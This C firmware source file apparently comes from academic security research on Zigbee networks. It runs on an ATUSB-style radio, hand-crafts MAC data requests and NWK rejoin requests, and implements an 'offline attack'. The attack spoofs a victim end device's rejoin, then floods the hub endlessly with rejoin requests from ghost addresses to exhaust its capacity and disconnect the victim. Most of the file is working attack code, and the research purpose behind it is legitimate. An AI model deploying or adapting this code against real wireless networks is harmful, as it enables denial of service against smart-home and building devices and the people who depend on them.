/*
 * fw/attacks/attack_12.c
 *
 * Written 2021 by Jincheng
 * Copyright 2021 Jincheng Wang
 *
 */
#include "attack.h"

extern uint8_t rejoin_full_flag;
extern uint8_t beacon_request_flag;
extern uint8_t tc_rejoin_request_flag;
extern uint8_t data_request_flag;

uint8_t count = 0;
unsigned char length = 0;
uint16_t FCF = 0;
unsigned char seqno = 0;
unsigned char cmd = 0;
/********  Transciver Library ********/

/**
 * @brief  set_rx_aack: Set the required registers used for RX_AACK mode, then transfer the state to RX_AACK
 * @note   
 * @param  aack_config: Config used to set RX_AACK
 * @retval None
 */
void set_rx_aack(rx_aack_config* aack_config)
{
	// This function is mostly called when there is packets being sent. So first make sure that current packet has been sent out.
	uint8_t reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
	while(reg_status != TRX_STATUS_TX_ARET_ON)
	{
		reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
		_delay_us(REG_CHANGE_DELAY);
	}
	// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
	change_state(TRX_CMD_FORCE_PLL_ON);
	reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
	while(reg_status != TRX_STATUS_PLL_ON) {
		reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
		_delay_us(REG_CHANGE_DELAY);
	}
	
	// Here we need to configure address for AACK, then transist into AACK mode
	reg_write(REG_SHORT_ADDR_0, aack_config->target_short_addr.addr_bytes[0]);
	reg_write(REG_SHORT_ADDR_1, aack_config->target_short_addr.addr_bytes[1]);
	reg_write(REG_PAN_ID_0, aack_config->target_pan_id.addr_bytes[0]);
	reg_write(REG_PAN_ID_1, aack_config->target_pan_id.addr_bytes[1]);

	// Set registers used by RX_AACK. Please refer to Page 55 in AT86RF231 spec.
	reg_write(0x0c, 0x00);
	reg_write(0x17, 0x02); // AACK_ACK_TIME: Send ACK quickly. Default value for 0x17: 0x00
	reg_write(0x2c, 0x38);
	if(!aack_config->dis_ack) {
		reg_write(0x2e, 0xc2);
	}
	else {
		reg_write(0x2e, 0xc2 | AACK_DIS_ACK);
	}
	if(aack_config->pending) {
		reg_write(0x2e, reg_read(0x2e) | AACK_SET_PD);
	}

	// Transist to RX_AACK_ON mode
	change_state(TRX_CMD_RX_AACK_ON);
	reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	// Finally, make sure the state transition is right
	while((reg_status != TRX_CMD_RX_AACK_ON) && (reg_status != TRX_STATUS_BUSY_RX_AACK))
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		_delay_us(REG_CHANGE_DELAY);
	}
}

/**
 * @brief  send_zbee_cmd: This is the framework for ATUSB to send packets
 * @note   
 * @param  layer:    	 Input: 1: MAC-Layer Command 2: NWK-Layer Command 3: APS-Layer Command
 * @param  command:  	 Input: The command ID which we want to send
 * @param  security: 	 Input: Security enable flags used in the frame
 * @param  dst_addr: 	 Input: dest addr information
 * @param  src_addr: 	 Input: src  addr information
 * @param  aack_config:  Input: user-defined aack_config
 * @retval None
 */
 
void send_zbee_cmd(uint8_t command, uint8_t security,
				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
				   rx_aack_config* aack_config)
{
	led(1);
	DELAY_1;
	uint8_t reg_status = 0;
	// 1: Change Transciver state to TRX_CMD_FORCE_PLL_ON
	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON) {
		_delay_us(REG_CHANGE_DELAY);
	}
	// 2: Send Packets
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	// Finally we applied hard-coded methods.
	switch (command) {
		case ZBEE_MAC_CMD_DATA_RQ:
			send_data_request(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RQ :
			send_rejoin_request(security, dst_addr, src_addr);
			break;
		default :
			break;
	}
	spi_end();
	// 3: Send the packet
	change_state(TRX_STATUS_TX_ARET_ON);
	while(reg_status != TRX_STATUS_TX_ARET_ON)
	{
		reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
		_delay_us(REG_CHANGE_DELAY);
	}
	slp_tr();
	// 4: Determine and configure the afterwards transciver mode
	if (aack_config->aack_flag)
	{
		set_rx_aack(aack_config);
	}
	else
	{
		// If RX_AACK is not needed, here we simply transform the state to RX_ON
		change_state(TRX_CMD_RX_ON);
		// change_state(TRX_CMD_PLL_ON);
	}
	led(0);
	DELAY_1;
}

static uint8_t spi_send_blocks(void *data, uint8_t size)
{
	uint8_t byte_count = 0 ;
	char* pdata = (char*)data;
	for(; byte_count < size; byte_count ++) {
		spi_send(*(pdata+byte_count));
	}

	assert(byte_count == size);
	return byte_count;
}

/********  END of Transciver Library *******/

/********  Command Library *******/

void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 10 + 2;
	FCF = 0x8863;
	seqno = 0xff;
	cmd = 0x04;

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}

// NWK Layer Command
void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 27 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x1009;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;

	uint8_t capability_info = 0x80;
	if (src_addr->device_type < 2)
	{
		// Here we send rejoin request in represnetative as a Full-Function Device
		capability_info |= 0x02;
	}
	if (src_addr->rx_when_idle)
	{
		capability_info |= 0x08;
	}

	cmd = 0x06;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	count += spi_send_blocks(&capability_info, sizeof(capability_info));

	assert(count == length - 1);

}


/********  END of Command Library *******/

/********  Attack-Specific Functions *******/
uint8_t capacity_attack(ieee802154_addr* hub_addr, uint64_t random_addr, uint8_t type)
{
	// Please check attack_12.c
	return 0;
}
uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
{
	// Please check attac_14.c
	return 0;
}
uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
{
	/** 1. Trigger ZED to leave and rejoin. **/
	rx_aack_config aack_config = {};
	aack_config.aack_flag = 0;
	aack_config.dis_ack = 0;
	aack_config.pending = 0;
	aack_config.target_short_addr.addr = victim_addr->short_addr;
	aack_config.target_pan_id.addr = victim_addr->pan;

	// Here we change the vicim rx type.
	victim_addr->rx_when_idle = 1;
	if (victim_addr->device_type == 1)
	{
		// TODO: Implement the Offline Attack logic for ZR
		// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
	}
	else if (victim_addr->device_type == 2)
	{
		if (victim_addr->polling_type == 2)
		{
			send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, victim_addr, &aack_config);
		}
		else if (victim_addr->polling_type == 1)
		{
			// TODO: How do we deal with ZED with low polling rate, e.g., Dimmer Switch?
		}
	}
	/** 2. Launch capacity attack again **/
	// Here we need to delay 1 second to wait for multiple Rejoin response finished.
	_delay_us(500);
	
	ieee802154_addr ghost_addr = *victim_addr;
	ghost_addr.short_addr = 0x1234;
	ghost_addr.long_addr = random_addr;
	aack_config.aack_flag = 1;
	aack_config.target_short_addr.addr = ghost_addr.short_addr;
	while (1)
	{
		ghost_addr.long_addr += 1;
		ghost_addr.short_addr += 1;
		aack_config.target_short_addr.addr = ghost_addr.short_addr;
		send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, hub_addr, &ghost_addr, &aack_config);
		if (ghost_addr.rx_when_idle == 0)
		{
			_delay_us(100);
			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, hub_addr, &ghost_addr, &aack_config);
		}
		_delay_ms(REJOIN_REQUEST_INTERVAL);

	}
	
	return 1;
}

/********  END of Attack-Specific Library *******/